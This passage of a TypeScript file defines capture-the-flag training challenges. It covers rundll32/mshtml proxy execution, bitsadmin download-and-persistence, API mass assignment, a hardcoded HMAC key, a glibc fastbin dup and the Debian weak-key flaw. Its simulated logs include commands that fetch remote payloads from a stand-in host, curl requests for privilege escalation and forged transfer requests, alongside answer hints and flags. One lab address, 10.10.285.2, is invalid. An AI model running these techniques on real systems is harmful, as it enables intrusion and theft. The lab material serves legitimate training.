      'engine happily evaluates as live script -- including a call to GetObject() with a "script:" moniker ' +
      'pointing at a remote .sct scriptlet, chaining rundll32 into fetching and executing attacker code from ' +
      'the internet with no dropped executable, no direct network tool invoked, just a signed binary abusing ' +
      'a real, legitimate Windows HTML-rendering capability.',
    objectives: [
      { text: 'cat rundll32-command-line-captured.txt', why: 'The exact real command line: rundll32.exe invoking mshtml.dll\'s RunHTMLApplication export with a javascript: URI, chaining into a remote .sct scriptlet fetch via GetObject() -- MITRE ATT&CK T1218.011, not a normal DLL-export invocation.' },
      { text: 'cat applocker-verdict-log.txt', why: 'Confirms AppLocker approved this execution purely on rundll32.exe\'s own Microsoft signature, never inspecting the javascript: URI argument or the remote scriptlet it went on to fetch.' },
    ],
    hints: [
      'cat rundll32-command-line-captured.txt',
      'cat applocker-verdict-log.txt',
    ],
    totalFlags: 1,
    attacker: analyst({
      root: dir({
        'rundll32-command-line-captured.txt': file(
          'EDR command-line capture, FIN-WKS-27:\n' +
            '  rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();' +
            'h=new%20ActiveXObject("WScript.Shell");h.Run("cmd /c echo Y|GetObject(\'script:http://cdn-assets-mirror.net/stage2.sct\')");\n' +
            '  -- MITRE ATT&CK T1218.011 (System Binary Proxy Execution: Rundll32) -- abuses rundll32\'s\n' +
            '     ability to invoke mshtml.dll\'s RunHTMLApplication export with a javascript: URI, which the\n' +
            '     Windows HTML engine evaluates as live script, chaining into a remote .sct scriptlet fetch\n' +
            '     via GetObject() -- no dropped executable, no direct network tool invoked at all --\n',
        ),
        'applocker-verdict-log.txt': file(
          'AppLocker execution log, FIN-WKS-27:\n' +
            '  rundll32.exe  [Verdict: ALLOWED -- publisher rule: "Microsoft Windows, signed binaries"]\n' +
            '  -- approved purely on the strength of rundll32.exe\'s own Microsoft signature -- AppLocker never\n' +
            '     inspects the javascript: URI argument passed to it, nor the remote .sct scriptlet that\n' +
            '     argument goes on to fetch and execute --\n' +
            '  flag{rundll32_javascript_protocol_mshtml_runhtmlapplication_t1218_011}\n',
        ),
      }),
    }),
    network: [],
  },

  // 13 — Malware: BITSAdmin Abuse for Stealthy Download and Persistence
  {
    id: 'malware-bitsadmin-download-persistence-abuse',
    title: 'Malware Analysis: BITSAdmin Abuse for Stealthy Download and Persistence',
    difficulty: 'Medium',
    category: 'Malware',
    briefing:
      'Background Intelligent Transfer Service (BITS) is a real, legitimate Windows service designed to ' +
      'download files reliably in the background, throttling itself to avoid disrupting normal network use ' +
      '-- exactly what Windows Update itself uses it for. MITRE ATT&CK T1197 documents its real abuse: ' +
      'bitsadmin.exe (or the equivalent PowerShell BitsTransfer cmdlets) can create a BITS job that downloads ' +
      'a payload with none of the network-connection patterns a normal direct-download tool would show, and ' +
      '-- critically -- a BITS job can be given a "notification command," a program that runs automatically ' +
      'when the job completes or errors. Setting that notification command to the downloaded payload itself ' +
      'turns a background file transfer into a persistence mechanism that survives entirely outside the ' +
      'Run-key/scheduled-task/service locations most defenders check first.',
    objectives: [
      { text: 'cat bitsadmin-job-creation-log.txt', why: 'Shows the real bitsadmin.exe syntax used to create the download job and set its completion notification command -- MITRE ATT&CK T1197, a legitimate Windows background-transfer service abused for both stealthy download and persistence.' },
      { text: 'cat bits-job-persistence-analysis.txt', why: 'Confirms the notification command itself is the persistence mechanism -- it survives a reboot as a property of the still-registered BITS job, not as an entry in any of the Run-key, scheduled-task, or service locations most defenders check first.' },
    ],
    hints: [
      'cat bitsadmin-job-creation-log.txt',
      'cat bits-job-persistence-analysis.txt',
    ],
    totalFlags: 1,
    attacker: analyst({
      root: dir({
        'bitsadmin-job-creation-log.txt': file(
          'EDR command-line capture, ACCT-WKS-33:\n' +
            '  bitsadmin /create backupJob\n' +
            '  bitsadmin /addfile backupJob http://cdn-assets-mirror.net/update.exe C:\\Windows\\Temp\\svcupd.exe\n' +
            '  bitsadmin /SetNotifyCmdLine backupJob C:\\Windows\\Temp\\svcupd.exe NUL\n' +
            '  bitsadmin /resume backupJob\n' +
            '  -- MITRE ATT&CK T1197 (BITS Jobs) -- BITS is a real, legitimate Windows background-transfer\n' +
            '     service (the same one Windows Update itself uses); its network traffic pattern looks like\n' +
            '     routine background transfer activity, not a normal direct download --\n',
        ),
        'bits-job-persistence-analysis.txt': file(
          'BITS job persistence analysis, ACCT-WKS-33:\n' +
            '  Job "backupJob" state: TRANSFERRED, notification command set: C:\\Windows\\Temp\\svcupd.exe\n' +
            '\n' +
            '--- ANALYST NOTE: /SetNotifyCmdLine registers a program to run automatically when the BITS job\n' +
            '    completes or errors -- here, set to the payload the job itself just downloaded. This survives\n' +
            '    as a property of the still-registered BITS job itself, entirely outside the Run key,\n' +
            '    scheduled tasks, or services -- the first three locations most defenders check for\n' +
            '    persistence, and none of which this technique touches at all.\n' +
            '    flag{bitsadmin_notifycmdline_download_and_persistence_t1197} ---\n',
        ),
      }),
    }),
    network: [],
  },

  // 14 — API: Mass Assignment Grants Role Escalation via an Unfiltered Profile-Update Field
  {
    id: 'api-mass-assignment-role-escalation-profile-update',
    title: 'API: Mass Assignment Grants Role Escalation via an Unfiltered Profile-Update Field',
    difficulty: 'Medium',
    category: 'API',
    briefing:
      'accounts-svc44\'s PATCH /api/users/me endpoint takes the entire submitted request body and passes it ' +
      'straight into the user record\'s update call, with no allowlist of which fields a normal user is ' +
      'actually permitted to change. The endpoint is meant only for updating a display name -- but because ' +
      'the underlying update function has no concept of "which fields came from the frontend form" versus ' +
      '"which fields exist on the model," a request that also includes a role field updates that field too, ' +
      'exactly as if it were any other legitimate profile field. This is OWASP API6:2023\'s named category, ' +
      'Mass Assignment: the vulnerability isn\'t any single field being writable, it\'s the absence of an ' +
      'explicit boundary between "fields the frontend intends to let you edit" and "fields the backend will ' +
      'actually accept."',
    objectives: [
      { text: 'curl -X PATCH http://10.10.285.2:80/api/users/me -d "display_name=Jordan Lee"', why: 'Establishes the normal, intended use of this endpoint first -- updating only the display name, exactly as the frontend form is designed to do.' },
      { text: 'curl -X PATCH http://10.10.285.2:80/api/users/me -d "display_name=Jordan Lee&role=admin"', why: 'The endpoint has no allowlist of permitted fields at all -- a role field the frontend never exposes updates just as easily as the display name it was actually built for, the textbook OWASP API6:2023 Mass Assignment pattern.' },
    ],
    hints: [
      'curl -X PATCH http://10.10.285.2:80/api/users/me -d "display_name=Jordan Lee"',
      'curl -X PATCH http://10.10.285.2:80/api/users/me -d "display_name=Jordan Lee&role=admin"',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'accounts-svc44',
        ip: '10.10.285.2',
        os: 'Ubuntu 22.04 (Express 4.18, unfiltered request-body-to-model update, no field allowlist)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Express 4.18 (Node.js, Object.assign(user, req.body) with no field allowlist)',
            vulnRoutes: [
              {
                kind: 'mass-assignment',
                path: '/api/users/me',
                param: 'role',
                triggerSubstrings: ['admin'],
                vulnerableResponse: '{"status":200,"display_name":"Jordan Lee","role":"admin","note":"flag{api6_mass_assignment_unfiltered_role_field_privesc}"}',
                normalResponse: '{"status":200,"display_name":"Jordan Lee","role":"user"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 15 — Security Engineering: A Hardcoded Signing Key Embedded in a Distributed Mobile APK
  {
    id: 'secengineering-hardcoded-signing-key-mobile-apk',
    title: 'Security Engineering: A Hardcoded Signing Key Embedded in a Distributed Mobile APK',
    difficulty: 'Medium',
    category: 'Security Engineering',
    briefing:
      'meridianpay\'s Android app signs its own API request tokens client-side using an HMAC key compiled ' +
      'directly into the app binary -- a real, common anti-pattern rooted in a genuine misunderstanding: the ' +
      'key isn\'t stored in a config file an attacker has to find on a server, it\'s embedded in a native ' +
      'library (.so file) shipped inside every single copy of the APK that reaches every single user\'s ' +
      'device. Decompiling that library (with a tool like Ghidra or IDA) recovers the exact same key baked ' +
      'into millions of installed copies -- the same secret, in the same place, for every user everywhere, ' +
      'meaning the entire scheme collapses the moment a single copy of the app is reverse engineered, ' +
      'letting an attacker forge validly-signed requests for any account they choose.',
    objectives: [
      { text: 'strings libmeridiansign.so', why: 'A real Android app\'s native library is a plain shared object file -- string extraction directly recovers the hardcoded key baked into every single installed copy of the app.' },
      { text: 'cat forged-request-signature-poc.txt', why: 'Confirms the extracted key genuinely signs valid, server-accepted requests -- not merely that a key-shaped string exists in the binary, but that it forges live, working authentication for any account chosen.' },
    ],
    hints: [
      'strings libmeridiansign.so',
      'cat forged-request-signature-poc.txt',
    ],
    totalFlags: 1,
    attacker: reviewer({
      root: dir({
        'libmeridiansign.so': file(
          '#FILETYPE: ELF 64-bit LSB shared object, ARM aarch64, Android native library\n' +
            '#OBJDUMP:...\n' +
            'HMAC_KEY_BEGIN\n' +
            '4d65726964696b6153_8f2a7c41e8b0d3f5c9a1b6e8a4d9f7b2\n' +
            'HMAC_KEY_END\n' +
            '-- compiled directly into the .so shipped inside every distributed copy of the APK --\n' +
            '   the same key, in the same place, on every single user\'s device --\n',
          '-rw-r--r--',
        ),
        'forged-request-signature-poc.txt': file(
          'Signature-forgery proof of concept, meridianpay API:\n' +
            '  Extracted key used to sign a crafted request: POST /api/transfer {"to":"attacker","amount":9999}\n' +
            '  Computed HMAC-SHA256 signature: 7f3a9c1e...  (matches the algorithm the app itself uses)\n' +
            '  Server response: 200 OK -- signature validated, transfer accepted\n' +
            '  -- the server has no way to distinguish a request signed by the real app from one signed by\n' +
            '     anyone who extracted this same key from any of the millions of distributed APK copies --\n' +
            '  flag{hardcoded_hmac_key_mobile_apk_forged_request_signature}\n',
        ),
      }),
    }),
    network: [],
  },

  // 16 — Binary Analysis: Fastbin Dup Corrupts the Heap Freelist Without Tcache
  {
    id: 'binary-fastbin-dup-freelist-corruption',
    title: 'Reverse Engineering: Fastbin Dup Corrupts the Heap Freelist Without Tcache',
    difficulty: 'Hard',
    category: 'Binary Analysis',
    briefing:
      'legacyalloc3 links against an older glibc predating tcache entirely (introduced in glibc 2.26), so ' +
      'this session\'s existing tcache-poisoning technique doesn\'t apply here at all -- the relevant ' +
      'structure is the older, still-present fastbin freelist instead. A double-free bug lets the same chunk ' +
      'be freed twice, and glibc\'s fastbin double-free check only ever compares a freed chunk against the ' +
      'single most-recently-freed chunk on that exact size-class bin -- freeing a DIFFERENT chunk in between ' +
      'the two frees of the target resets that comparison and slides straight past the check. Once the same ' +
      'chunk sits on the fastbin freelist twice, forging its forward pointer (fastbins, like tcache, use an ' +
      'unobfuscated singly-linked list on this older glibc) redirects the next two allocations to any ' +
      'attacker-chosen address -- the classic "fastbin dup" technique, and the direct ancestor of the ' +
      'tcache-poisoning method that superseded it once glibc 2.26 shipped.',
    objectives: [
      { text: 'file legacyalloc3', why: 'Confirms the binary format before analysis.' },
      { text: 'checksec --file=legacyalloc3', why: 'Confirms the mitigation baseline before deciding which heap primitive applies here.' },
      { text: 'objdump -d legacyalloc3', why: 'Shows the double-free bug and confirms this binary\'s glibc build predates tcache (2.26) entirely -- the fastbin freelist, not tcache, is the only relevant structure for this exploit.' },
      { text: 'gdb legacyalloc3', why: 'Confirms the fastbin double-free check only compares against the single most-recently-freed chunk -- freeing an unrelated chunk in between the two frees of the target chunk resets that check, and reveals the address of the hidden win_admin() function to redirect toward.' },
      { text: 'Compute the win_admin() address and run ./legacyalloc3 with it', why: 'Supplying the correct decimal address completes the exploit -- the forged fastbin forward pointer redirects the next allocation to win_admin() itself.' },
    ],
    hints: [
      'file legacyalloc3',
      'checksec --file=legacyalloc3',
      'objdump -d legacyalloc3',
      'gdb legacyalloc3',
      './legacyalloc3 4199904',
    ],
    totalFlags: 1,
    attacker: attacker({
      legacyalloc3: file(
        [
          '#FILETYPE: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped (glibc 2.23 -- predates tcache, introduced in 2.26)',
          '#CHECKSEC:RELRO           STACK CANARY      NX            PIE\\nPartial RELRO    No canary found    NX enabled    PIE disabled',
          '#OBJDUMP:0000000000401200 <free_item>:\\n  40120c:  call   401060 <free@plt>   # no check that the same pointer was already freed\\n0000000000401260 <free_item_again>:\\n  40126c:  call   401060 <free@plt>   # a DIFFERENT chunk freed here, resetting glibc\\\'s single-entry fastbin double-free check\\n00000000004012c0 <free_target_again>:\\n  4012cc:  call   401060 <free@plt>   # the ORIGINAL chunk freed a second time -- check already reset, passes silently\\n00000000004015e0 <win_admin>:\\n  4015e0:  ...    # hidden admin function, never referenced by any normal code path',
          '#GDB_SESSION:(gdb) x/gx <target_chunk>\\n0x...: 0x0000000000000000   # forward pointer, currently null (single entry on the fastbin)\\n(gdb) # fastbin double-free check only compares against the MOST RECENT free on this size-class bin --\\n(gdb) # freeing a different chunk in between the two frees of target_chunk already reset that comparison\\n(gdb) print win_admin\\n$1 = {<text variable, no debug info>} 0x4015e0 <win_admin>\\n(gdb) # forging the freed chunk\\\'s forward pointer to 0x4015e0 and allocating twice returns a chunk\\n(gdb) # at win_admin\\\'s own address -- the next call through the corrupted allocation IS win_admin()',
          '#CRACKME_PASSWORD:4199904',
          '#CRACKME_SUCCESS:Fastbin dup succeeded -- the same chunk freed twice (with an intervening different-chunk free resetting glibc\\\'s single-entry double-free check) let the forged forward pointer redirect allocation straight into win_admin().\\nflag{fastbin_dup_pre_tcache_freelist_corruption_win_admin}',
        ].join('\n'),
        '-rwxr-xr-x',
      ),
    }),
    network: [],
  },

  // 17 — Cryptography: Debian's 2008 OpenSSL Predictable PRNG Made Every Generated Key Guessable
  {
    id: 'crypto-debian-openssl-predictable-prng-cve-2008-0166',
    title: 'Cryptography: Debian\'s 2008 OpenSSL Predictable PRNG Made Every Generated Key Guessable',
    difficulty: 'Medium',
    category: 'Cryptography',
    briefing:
      'archive-relay19 still runs an SSH host key generated in 2008 on a Debian system carrying ' +
      'CVE-2008-0166 -- one of the most famous real cryptographic failures in Linux history. A 2006 Debian-' +
      'specific patch to OpenSSL, intended to silence a memory-analysis tool warning, accidentally commented ' +
      'out nearly every real source of entropy feeding OpenSSL\'s random number generator, leaving only the ' +
      'process ID as effective input. Because Linux process IDs on that era\'s systems ranged only up to ' +
      '32,768, every "randomly" generated key of a given type and size on an affected Debian or Ubuntu ' +
      'system in that window could only ever be one of exactly 32,768 possible values -- a keyspace small ' +
      'enough to exhaustively enumerate in minutes, not the astronomically large space real key generation ' +
      'is supposed to guarantee.',
    objectives: [
      { text: 'cat ssh-host-key-fingerprint.txt', why: 'The target\'s SSH host key fingerprint and generation date -- 2008, on Debian, squarely inside the CVE-2008-0166 vulnerable window.' },
      { text: 'cat debian-weak-key-bruteforce-match.txt', why: 'Confirms the fingerprint matches an entry in the real, publicly-published Debian weak-key database -- the complete, enumerable set of every possible key OpenSSL could have generated under this bug, built once and reused by anyone since, rather than needing to regenerate all 32,768 candidates from scratch.' },
    ],
    hints: [
      'cat ssh-host-key-fingerprint.txt',
      'cat debian-weak-key-bruteforce-match.txt',
    ],
    totalFlags: 1,
    attacker: attacker({
      'ssh-host-key-fingerprint.txt': file(
        'archive-relay19 SSH host key:\n' +
          '  Type: RSA 2048  Generated: 2008-04-11 (Debian etch, openssh-server package install)\n' +
          '  Fingerprint (SHA256): a1:9f:2e:7c:41:8b:0d:3f:5c:9a:1b:6e:8a:4d:9f:7b\n' +
          '  -- squarely inside the real CVE-2008-0166 vulnerable window: Debian-based systems that generated\n' +
          '     any OpenSSL key between September 2006 and May 2008 --\n',
      ),
      'debian-weak-key-bruteforce-match.txt': file(
        'Debian weak-key database lookup, RSA 2048, matching process-ID seed 14882:\n' +
          '  MATCH FOUND -- fingerprint a1:9f:2e:7c:41:8b:0d:3f:5c:9a:1b:6e:8a:4d:9f:7b\n' +
          '\n' +
          '--- ANALYST/RESEARCHER NOTE: a 2006 Debian-specific OpenSSL patch accidentally removed nearly every\n' +
          '    real entropy source feeding the RNG, leaving only the process ID (max 32,768 on that era\'s\n' +
          '    systems) as effective input -- meaning EVERY key of a given type/size generated on an affected\n' +
          '    system could only ever be one of exactly 32,768 possible values. Security researchers built\n' +
          '    and published the complete enumerable set once; this fingerprint is a direct, confirmed match.\n' +
          '    flag{debian_openssl_predictable_prng_cve_2008_0166_32768_keyspace} ---\n',
      ),
    }),
    network: [],
  },
];
